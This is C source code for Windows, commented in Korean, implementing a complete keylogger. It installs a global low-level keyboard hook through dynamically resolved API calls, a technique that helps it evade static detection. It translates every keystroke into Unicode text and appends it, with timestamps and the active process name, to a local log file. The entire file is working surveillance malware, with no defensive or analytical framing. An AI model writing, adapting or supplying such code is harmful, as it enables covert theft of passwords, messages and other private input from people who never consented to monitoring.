#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <psapi.h> // GetModuleFileNameExA를 사용하기 위해 필요
#include <locale.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "psapi.lib") // GetModuleFileNameExA 링크를 위해 필요

// 파일 저장 경로 (유니코드 파일 처리를 위해 WCHAR 사용)
#define LOG_FILE_NAME L"keyboard_log_unicode.txt" 
#define MAX_KEY_NAME_LENGTH 32
#define MAX_PROCESS_NAME_LENGTH 256

// 동적으로 로드할 API 함수의 프로토타입 정의 (이전과 동일)
typedef HHOOK(WINAPI* pSetWindowsHookExA_T)(int, HOOKPROC, HINSTANCE, DWORD);
typedef BOOL(WINAPI* pUnhookWindowsHookEx_T)(HHOOK);
typedef LRESULT(WINAPI* pCallNextHookEx_T)(HHOOK, int, WPARAM, LPARAM);

// 전역 훅 핸들 및 함수 포인터
HHOOK g_hHook = NULL;
pSetWindowsHookExA_T pSetWindowsHookEx = NULL;
pUnhookWindowsHookEx_T pUnhookWindowsHookEx = NULL;
pCallNextHookEx_T pCallNextHookExFunc = NULL;

// 마지막으로 기록된 프로세스의 이름 (중복 기록 방지용)
char g_LastProcessName[MAX_PROCESS_NAME_LENGTH] = "";
// 현재 키보드 레이아웃(언어) 핸들
HKL g_hkl = 0;

// ------------------------------------------------
// 프로세스 이름 가져오기 및 파일에 기록하는 헬퍼 함수 (WCHAR 기반 I/O로 변경)
// ------------------------------------------------
void LogProcessInfo() {
    HWND foregroundWindow = GetForegroundWindow();
    DWORD processId;

    // 현재 키보드 레이아웃을 가져와서 전역 변수에 저장 (ToUnicodeEx에서 사용)
    g_hkl = GetKeyboardLayout(GetWindowThreadProcessId(foregroundWindow, NULL));

    GetWindowThreadProcessId(foregroundWindow, &processId);

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
    if (hProcess == NULL) return;

    char currentProcessName[MAX_PROCESS_NAME_LENGTH];

    if (GetModuleFileNameExA(hProcess, NULL, currentProcessName, MAX_PROCESS_NAME_LENGTH)) {

        if (strcmp(g_LastProcessName, currentProcessName) != 0) {

            // 유니코드 파일 쓰기를 위해 _wfopen 사용
            FILE* logFile = _wfopen(LOG_FILE_NAME, L"a");
            if (logFile) {
                time_t t = time(NULL);
                struct tm* tm = localtime(&t);

                // 유니코드 출력을 위해 fwprintf 사용 (시간 정보는 일반 char로 출력)
                fwprintf(logFile, L"\n\n[%04d-%02d-%02d %02d:%02d:%02d] -> Process: %hs\n",
                    tm->tm_year + 1900, tm->tm_mon + 1, tm->tm_mday,
                    tm->tm_hour, tm->tm_min, tm->tm_sec,
                    currentProcessName); // %hs는 char*를 유니코드 파일에 기록
                fclose(logFile);

                strncpy(g_LastProcessName, currentProcessName, MAX_PROCESS_NAME_LENGTH - 1);
                g_LastProcessName[MAX_PROCESS_NAME_LENGTH - 1] = '\0';
            }
        }
    }
    CloseHandle(hProcess);
}

// ------------------------------------------------
// 유니코드 키 코드를 파일에 기록하는 헬퍼 함수
// ------------------------------------------------
void LogKeyToFileW(const WCHAR* keyOutput) {
    // 유니코드 파일 쓰기를 위해 _wfopen 사용
    FILE* logFile = _wfopen(LOG_FILE_NAME, L"a");
    if (logFile) {
        // 유니코드 문자열을 파일에 기록
        fwprintf(logFile, L"%s", keyOutput);
        fclose(logFile);
    }
}


// ------------------------------------------------
// 1. 훅 프로시저: 키보드 이벤트 발생 시 호출되는 콜백 함수
// ------------------------------------------------
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* pKeyStruct = (KBDLLHOOKSTRUCT*)lParam;

        if (wParam == WM_KEYDOWN) {

            LogProcessInfo(); // 프로세스 및 HKL 업데이트

            DWORD vkCode = pKeyStruct->vkCode;
            BYTE keyState[256];
            WCHAR keyNameW[MAX_KEY_NAME_LENGTH] = { 0 }; // WCHAR 배열 사용
            int result;

            if (!GetKeyboardState(keyState)) goto call_next;

            // 모디파이어 키 상태 조정 (ToUnicodeEx의 정확도를 높이기 위해 필요)
            if ((GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0) keyState[VK_SHIFT] |= 0x80;
            if ((GetAsyncKeyState(VK_CAPITAL) & 0x1) != 0) keyState[VK_CAPITAL] |= 0x1;

            // 3. ToUnicodeEx를 사용하여 유니코드 문자로 변환
            result = ToUnicodeEx(vkCode, pKeyStruct->scanCode, keyState, keyNameW, MAX_KEY_NAME_LENGTH, 0, g_hkl);

            if (result > 0) {
                // 성공적으로 문자로 변환된 경우
                keyNameW[result] = L'\0';

                // 콘솔 출력 (유니코드를 위한 wprintf 사용) 및 파일 기록
                wprintf(L"%s", keyNameW);
                LogKeyToFileW(keyNameW);

            }
            else {
                // 특수 키 처리 (Enter, Space, Tab 등)
                WCHAR specialKeyString[MAX_KEY_NAME_LENGTH] = L"";

                switch (vkCode) {
                case VK_RETURN: wcscpy(specialKeyString, L"[ENTER]\n"); break;
                case VK_SPACE: wcscpy(specialKeyString, L" "); break;
                case VK_TAB: wcscpy(specialKeyString, L"[TAB]"); break;
                case VK_BACK: wcscpy(specialKeyString, L"[BACK]"); break;
                case VK_DELETE: wcscpy(specialKeyString, L"[DEL]"); break;
                case VK_LSHIFT: case VK_RSHIFT: case VK_CONTROL: case VK_MENU:
                    break;
                default:
                    // 특수 키 이름도 유니코드로 가져옴
                    if (GetKeyNameTextW(pKeyStruct->scanCode << 16, specialKeyString, MAX_KEY_NAME_LENGTH)) {
                        WCHAR temp[MAX_KEY_NAME_LENGTH + 2];
                        wsprintfW(temp, L"[%s]", specialKeyString);
                        wcscpy(specialKeyString, temp);
                    }
                    break;
                }

                if (wcslen(specialKeyString) > 0) {
                    wprintf(L"%s", specialKeyString);
                    LogKeyToFileW(specialKeyString);
                }
            }
        }
    }

call_next:
    if (pCallNextHookExFunc) {
        return pCallNextHookExFunc(g_hHook, nCode, wParam, lParam);
    }
    return 0;
}

// ------------------------------------------------
// 2. 동적 API 로더 및 3. 메인 함수 
// ------------------------------------------------
BOOL InitializeDynamicAPIs() {
    HMODULE hUser32 = LoadLibraryA("User32.dll");
    if (hUser32 == NULL) return FALSE;

    pSetWindowsHookEx = (pSetWindowsHookExA_T)GetProcAddress(hUser32, "SetWindowsHookExA");
    pUnhookWindowsHookEx = (pUnhookWindowsHookEx_T)GetProcAddress(hUser32, "UnhookWindowsHookEx");
    pCallNextHookExFunc = (pCallNextHookEx_T)GetProcAddress(hUser32, "CallNextHookEx");

    if (!pSetWindowsHookEx || !pUnhookWindowsHookEx || !pCallNextHookExFunc) return FALSE;

    printf("[+] Dynamic API addresses loaded successfully.\n");
    return TRUE;
}

int main() {
    // 콘솔에서 유니코드(한글) 출력을 위해 Locale 설정 (선택적)
    setlocale(LC_ALL, "korean");

    if (!InitializeDynamicAPIs()) return 1;

    printf("[+] Installing Low-Level Keyboard Hook...\n");

    g_hHook = pSetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);

    if (g_hHook == NULL) {
        printf("[-] Error: Failed to install hook. GetLastError: %d\n", GetLastError());
        return 1;
    }

    wprintf(L"[+] Hook installed. Monitoring keyboard input...\n");
    LogProcessInfo();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    if (g_hHook && pUnhookWindowsHookEx) {
        pUnhookWindowsHookEx(g_hHook);
        printf("[+] Hook uninstalled.\n");
    }

    return 0;
}